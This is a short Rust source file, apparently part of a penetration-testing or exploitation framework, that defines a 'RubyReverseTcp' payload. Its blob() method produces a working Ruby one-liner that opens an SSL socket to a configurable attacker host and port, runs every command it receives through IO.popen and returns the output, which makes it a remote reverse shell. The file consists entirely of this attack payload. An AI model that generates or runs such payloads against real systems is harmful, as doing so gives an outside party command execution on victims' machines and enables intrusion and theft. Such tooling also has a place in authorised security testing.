use crate::core::payload::{reverse::Reverse, Payload};

// TODO: maybe can remove public
pub struct RubyReverseTcp {
    pub reverse: Reverse,
}

impl Payload for RubyReverseTcp {
    fn blob(&self) -> Vec<u8> {
        let blob = format!("require 'socket';require 'openssl';c=OpenSSL::SSL::SSLSocket.new(TCPSocket.new(\"{}\",\"{}\")).connect;while(cmd=c.gets);IO.popen(cmd.to_s,\"r\"){{|io|c.print io.read}}end", self.reverse.lhost, self.reverse.lport);
        blob.into_bytes()
    }
}
